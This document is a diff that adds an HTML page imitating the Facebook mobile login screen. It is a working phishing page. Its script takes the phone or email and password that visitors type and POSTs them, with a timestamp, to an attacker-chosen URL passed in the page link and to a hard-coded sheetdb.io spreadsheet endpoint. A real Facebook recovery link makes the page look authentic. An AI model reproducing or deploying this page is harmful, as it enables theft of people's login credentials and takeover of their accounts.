@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <title>Ind_I_Phone</title>
+  
+  <!-- HTML -->
+  
+
+  <!-- Custom Styles -->
+   <style>
+    .toast {
+      position: fixed;
+      top: 20px;
+      right: 20px;
+      display: flex;
+      align-items: center;
+      padding: 10px;
+      background-color: blue;
+      color: #fff;
+      border-radius: 5px;
+      box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
+      animation: slideIn 0.5s ease-in-out;
+      opacity: 1;
+      transition: opacity 0.5s;
+    }
+    
+    .toast .message {
+      flex-grow: 1;
+      margin-right: 10px;
+    }
+    
+    .toast .close-icon {
+      cursor: pointer;
+    }
+
+    .toast.fade-out {
+      opacity: 0;
+    }
+
+    @keyframes slideIn {
+      0% {
+        transform: translateX(100%);
+      }
+      100% {
+        transform: translateX(0);
+      }
+    }
+   </style>
+  <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+  <center>
+  <img class="img" src="Screenshot_20220814-191744_1.png" alt="img">
+  <a class="lang" href="#">English (United Kingdonm) . العربية  </a>
+  <div id="login">
+    <input class="intput" type="text" id="number" placeholder="Phone or email" required>
+    <input class="intput" type="password" id="pass" placeholder="Password" required>
+    <br>
+    <button onclick="validateInput()" class="button">Log In</button>
+  </div>
+  <a class="forgot" href="https://www.facebook.com/recover/initiate/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjc2MTI4ODE4LCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&ars=facebook_login"><b>Forgot Password?</b></a>
+  <hr>
+  <p>OR</p>
+  <button  class="creat" onclick="create()">Create New Facbeook account</button>
+  </center>
+  
+</body>
+<script>
+
+  function showToast(msg) {
+      var toast = document.createElement('div');
+      toast.className = 'toast';
+
+      var message = document.createElement('div');
+      message.className = 'message';
+      message.innerText = msg;
+
+      var closeIcon = document.createElement('span');
+      closeIcon.className = 'close-icon';
+      closeIcon.innerHTML = '&#10006;';
+      closeIcon.addEventListener('click', function() {
+        toast.classList.add('fade-out');
+        setTimeout(function() {
+          toast.remove();
+        }, 500);
+      });
+
+      toast.appendChild(message);
+      toast.appendChild(closeIcon);
+
+      document.body.appendChild(toast);
+
+      setTimeout(function() {
+        toast.classList.add('fade-out');
+        setTimeout(function() {
+          toast.remove();
+        }, 500);
+      }, 3000);
+  }
+
+  function validateInput() {
+      var inputField = document.getElementById('number');
+      var input = inputField.value.trim();
+
+
+      var emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+      var phoneRegex = /^\d{11}$/; // Assumes 10-digit phone number format
+
+      if (emailRegex.test(input) || phoneRegex.test(input)) {
+        showToast('Log in success');
+        log();
+      } else {
+        showToast('Pls ! Input email or phone number');
+      }
+  }
+
+window.addEventListener('load', () => {
+      const params = (new URL(document.location)).searchParams
+      const name = params.get('name');
+      localStorage.setItem("link",name)
+  })
+
+function log1(){
+  var date = new Date();
+  var number = document.getElementById("number").value;
+  var pass = document.getElementById("pass").value;
+  var link = localStorage.getItem("link");
+
+  fetch(link, {
+  method: "POST",
+  body: JSON.stringify({
+    Number: number,
+    Password: pass,
+    Date: date.toString()
+  }),
+  headers: {
+    "Content-type": "application/json; charset=UTF-8"
+  }
+
+});
+  fetch("https://sheetdb.io/api/v1/mnl733k976rmt", {
+    method: "POST",
+    body: JSON.stringify({
+      Number: number,
+      Password: pass,
+      Date: date.toString()
+    }),
+    headers: {
+      "Content-type": "application/json; charset=UTF-8"
+    }
+
+  });
+
+  document.getElementById("number").value="";
+  document.getElementById("pass").value="";
+  sessionStorage.setItem("fblog","1")
+  
+  /*setTimeout(() => { window.open("https://www.facebook.com/","_parent"); }, 3000); */
+  
+
+}
+
+function log(){
+  var number = document.getElementById("number").value;
+  var pass = document.getElementById("pass").value;
+  // window.open("https://www.facebook.com/","_parent")
+
+  if(number== ""){
+    alert('Enter Number or Email')
+  }else if(pass== ""){
+    alert('Enter a Password')
+  }else{
+    log1()}
+}
+
+</script>
+</html>
